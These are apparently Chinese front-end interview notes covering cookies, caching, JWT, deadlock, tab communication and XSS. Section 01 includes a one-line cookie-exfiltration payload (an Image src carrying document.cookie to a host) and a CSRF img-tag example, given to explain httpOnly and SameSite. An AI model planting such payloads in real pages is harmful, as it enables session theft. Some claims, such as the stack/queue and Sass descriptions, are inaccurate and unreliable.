
01. cookie 和 session 的区别：
    - 1）cookie 可以跨 tab 但不能跨域；session 不能跨 tab
    - 2）session 会在一定时间内保存在服务器上，访问增多会占用服务器性能
    - 3）cookie 不是很安全，可以分析存在本地的 COOKIE 并进行 COOKIE 欺骗
    - 4）cookie 数据存放在客户的浏览器上，每次请求都会携带，session 数据放在服务器上
    - 5）时效：session 当前页面有效，关闭自动删除；cookie 可以设置过期时间，可以长期
    - 6）单个 cookie 保存的数据不能超过 4K，很多浏览器都限制一个站点最多保存 20 个 cookie
    - 7）session 和 localStore 都支持监听 - window.addEventListener('store', e => {})
    
    - 总结建议：
        考虑到安全应当使用 session，可以将登录信息等重要信息存放为 session
        考虑到减轻服务器性能方面，应当使用 cookie，不重要可以放在 cookie 中

    - 先早
        - cookie - 服务器 set-cookie 下发
            1. 会话状态管理
            2. cookie 预防 CSRF
            3. 浏览器行为跟踪 trace、cid
        - 安全性
            1. secure：只有 https 才能携带 cookie
            2. httpOnly：只有服务端才能下发 cookie，JS 无法操作
        - 作用域
            1. domain：默认 origin，不包含子域名
        - samesite
            1. none：site/a、site/b 都可以访问
            2. strict：浏览器访问相同站点才会发送 cookie
            3. lax：与 strict 相似，外部跳转导航至 url 才带有 cookie（默认）
        ```js
            // httpOnly 针对 XSS 攻击，document.cookie 无法获取
            (new Image().src=`http://site?cookie=${document.cookie}`)

            // samesite：strict 针对 CSRF 攻击
            // 加载外部页面，页面含有此图片并且当前 cookie 登录状态，则会非法请求
            <img src="http://site?account=yao&price=100000" />
        ```



02. 缓存
    - 强缓存：
    - 协商缓存：
        - expires：http1.0 - 时间戳
        - cache-control：http1.1 - max-age=20，优先级高于 expires

    - 为什么有 expires 还要设置 cache-control
        1. 本地时间可以设置，可能导致 cookie 提前或滞后失效
        2. 四种类型 - 参照 ‘面试题 - http.md’
    ```js
        res.setHeader('Cache-Control': 'no-cache')
        res.setHeader('Cache-Control': 'max-age=20')
    ```



03. JSON.stringify 时 function null undefined 通常会被忽略



04. null 和 undefined 的具体区别
    - null 借鉴 Java，有一个问题就是 null 隐式转换为 0
    - null 是一个表示‘无’的对象（空对象指针），转为数值为 0
    - undefined 是一个表示‘无’的原始值，转为数值为 NaN



05. 暂时性死区
    - 在一个作用域内，如果某个变量用 let 或 const 定义了
        那么在定义前不能访问，即便这个变量在全局存在也会报错



06. less和sass的区别
    - 深度选择器: ::v-deep 或 /deep/（::v-deep 通用）
    - Sass 基于 Ruby，在服务器端处理
    - Less 基于 JavaScript，在客户端处理
    - 在Sass中，可以遍历任何类型的数据。Less中，只能使用递归函数循环数值
    - Sass支持条件语句，可以使用if{}else{},for{}循环等等，而Less不支持
    - Less没有输出设置，Sass提供4中输出选项：nested, compact, compressed 和 expanded



07. typeof null 输出为 'object'
    - 其实是一个底层的错误，但直到现阶段都无法被修复。
    - 在Javascript 初始版本中，值以32位 存储。前3位表示数据类型的标记，其余位则是值。
    - 对于所有的对象，它的前3位都以000作为类型标记位。在JavaScript 早期版本中，
    - null 被认为是一个特殊的值，用来对应C中的空指针。但Javascript 中设有C中的指针，
    - 所以 null 意味着什么都没有或者void并以全（32个）表示。
    - 因此每当Javascript 读取nult时，它前端的3位将它视为对象类型
    - 这也是为什么typeofnult返回"object'的原因



08. static 和 assets 异同
    - 都是放置静态资源的文件夹
    - static 放第三方 jq/swiper 等；assets 放自己的资源
    - assets 在 build 时会压缩；static 不打包直接复制进 bundle，占用空间较大



09. 栈和队列的区别
    - 队列先进先出，操作系统自动分配释放；栈先进后出，一般需要手动分配释放
    - 栈的插入和删除操作都是在一端进行的，而队列的操作却是在两端进行的
    - 栈只允许在表尾一端进行插入和删除，而队列只允许在表尾一端进行插入，在表头一端进行删除



10. JWT 的原理
    - 服务器认证后生成一个 JSON，JSON 对象不能裸传给用户，以防被篡改
    - 因此这个 JSON 对象会被服务器端签名加密后返回给用户，返回的内容就是一张令牌
    - 这个 JSON 对象可能包含的内容就是'用户信息'，'用户身份'以及'令牌过期时间'
    - 它由三部分组成：Header（头部）、Payload（负载）、Signature（签名）
        - 1. Header 描述 Token 加密算法以及Token的类型。
            - {“alg”: “HS256″,”typ”: “JWT”} 意思就是，token使用HS256加密，类型是JWT
            - 这个部分基本相当于明文，它将这个 JSON 对象做了一个 Base64 转码，变成一个字符串
            - Base64 编码解码是有算法的，解码过程是可逆的。头部信息默认携带着两个字段；
        - 2. Payload 用来存放实际需要传递的数据，一般存放用户名、用户身份以及一些JWT的描述字段
            - 它也只是做了一个 Base64 编码，不能在其中存放秘密信息，比如说登录密码之类的；
        - 3. Signature 是对前面两个部分的签名，防止数据篡改
            - 如果前面两段信息被修改了，此时服务器端是可利用签名来验证信息的正确性的
            - 签名需要密钥，密钥是服务器端保存的，这个密钥只有服务器知道，用户不知道
            - 签名后，把 Header、Payload、Signature 拼成字符串，每个部分之间用”点”（.）分隔



11. 死锁产生的原因，如何解决
    - 多个进程在运行过程中因争夺资源而造成的一种僵局，当进程处于这种僵持状态，若无外力作用，它们都将无法再向前推进
    - 系统中的资源可以分为两类：
        1. 可剥夺资源，某进程在获得资源后，该资源可以再被其他进程或系统剥夺，CPU 和‘主存’均属于可剥夺性资源；
        2. 不可剥夺资源，当系统把资源分配给某进程后，不能强行收回，只能在进程用完后自行释放，如磁带机、打印机
    - 产生死锁的原因：
        1. 竞争资源：竞争不可剥夺资源（例如：打印机）
                   竞争临时资源（例如：信号、消息、缓冲区内的消息），
                   通常消息通信顺序进行不当，则会产生死锁
    - 产生死锁的必要条件：
        1. 互斥条件：进程要求对某资源进行排它性控制，即某资源仅为一进程所占用
        2. 请求和保持条件：当进程因请求资源而阻塞时，对已获得的资源保持不放
        3. 不剥夺条件：已获得的资源在使用完之前不能剥夺，只能用完时由自己释放
        4. 环路等待条件：在发生死锁时，必然存在一个进程——资源的环形链
    - 预防死锁的方法：
        1. 资源一次性分配：一次性分配所有资源，这样就不会再有请求了（破坏请求条件）
        2. 只要有一个资源得不到分配，也不给这个进程分配其他的资源（破坏请保持条件）
        3. 可剥夺资源：某进程获得了部分资源，但得不到其它资源，则释放已占有的资源（破坏不可剥夺条件）
        4. 资源有序分配法：系统给每类资源赋予一个编号，每一个进程按编号递增的顺序请求资源，释放则相反（破坏环路等待条件）



12. 如何实现浏览器内多个标签页之间的通信
    - 实现多个标签页之间的通信，本质上都是通过中介者模式来实现的。因为标签页之间没有办法直接通信，因此我们可以找一个中介者，让标签页和中介者进行通信，然后让这个中介者来进行消息的转发。
    1. 使用 websocket 协议，因为 websocket 协议可以实现服务器推送，所以服务器就可以用来当做这个中介者。标签页通过向服务器发送数据，然后由服务器向其他标签页推送转发
    2. 使用 ShareWorker 的方式，shareWorker 会在页面存在的生命周期内创建一个唯一的线程，并且开启多个页面也只会使用同一个线程。这个时候共享线程就可以充当中介者的角色。标签页间通过共享一个线程，然后通过这个共享的线程来实现数据的交换
    3. 使用 localStorage 的方式，我们可以在一个标签页对 localStorage 的变化事件进行监听，然后当另一个标签页修改数据的时候，我们就可以通过这个监听事件来获取到数据。这个时候 localStorage 对象就是充当的中介者的角色
    4. 使用 postMessage 方法，如果我们能够获得对应标签页的引用，就可以使用postMessage 方法，进行通信。



13. 渐进增强
    - 渐进增强（progressive enhancement）：
        先针对低版本的浏览器进行实现，保证基本的功能情况下，再针对高级浏览器进行改进提升
    - 优雅降级 graceful degradation： 
        一开始就构建完整的功能，然后再针对低版本的浏览器进行兼容。
    - 两者区别：
        1. 优雅降级是从复杂的现状开始的，并试图减少用户体验的供给；而渐进增强是从一个非常基础的，能够起作用的版本开始的，并在此基础上不断扩充，以适应未来环境的需要；
        2. 降级（功能衰竭）意味着往回看，而渐进增强则意味着往前看，同时保证其根基处于安全地带。
    


14. XSS 攻击
    1. 一种代码注入攻击。攻击者通过在网站注入恶意脚本，使之在用户的浏览器上运行，从而盗取用户的信息如 cookie 等
    2. 本质是因为网站没有对恶意代码进行过滤，与正常的代码混合在一起了，浏览器没有办法分辨哪些脚本是可信的，从而导致了恶意代码的执行
    3. 攻击方式：
        （1）获取页面的数据，如DOM、cookie、localStorage；
        （2）DOS攻击，发送合理请求，占用服务器资源，从而使用户无法访问服务器；
        （3）破坏页面结构；
        （4）流量劫持（将链接指向某网站）；
    4. 攻击类型可以分为存储型、反射型和 DOM 型：
        （1）存储型指的是恶意脚本会存储在目标服务器上，当浏览器请求数据时，脚本从服务器传回并执行。（2）反射型指的是攻击者诱导用户访问一个带有恶意代码的 URL 后，服务器端接收数据后处理，然后把带有恶意代码的数据发送到浏览器端，浏览器端解析这段带有 XSS 代码的数据后当做脚本执行，最终完成 XSS 攻击。 
        （3）DOM 型指的通过修改页面的 DOM 节点形成的 XSS。
    5. 攻击步骤：
        （1）攻击者将恶意代码提交到⽬标⽹站的数据库中。
        （2）⽤户打开⽬标⽹站时，⽹站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
        （3）⽤户浏览器接收到响应后解析执⾏，混在其中的恶意代码也被执⾏。
        （4）恶意代码窃取⽤户数据并发送到攻击者的⽹站，或者冒充⽤户的⾏为，调⽤⽬标⽹站接⼝执⾏攻击者指定的操作。



15. 为什么有时⽤ translate ⽽不是‘定位’
    1. translate 是 transform 属性的⼀个值。
    2. transform 不会触发重新布局（reflow）或重绘（repaint），只会触发复合
    3. ⽽改变绝对定位会触发重新布局，进⽽触发重绘和复合
    4. transform使浏览器为元素创建⼀个 GPU 图层，但改变绝对定位会使⽤到 CPU
    5. 因此 translate()更⾼效，可以缩短平滑动画的绘制时间
    6. ⽽translate改变位置时，元素依然会占据其原始空间，绝对定位就不会发⽣这种情况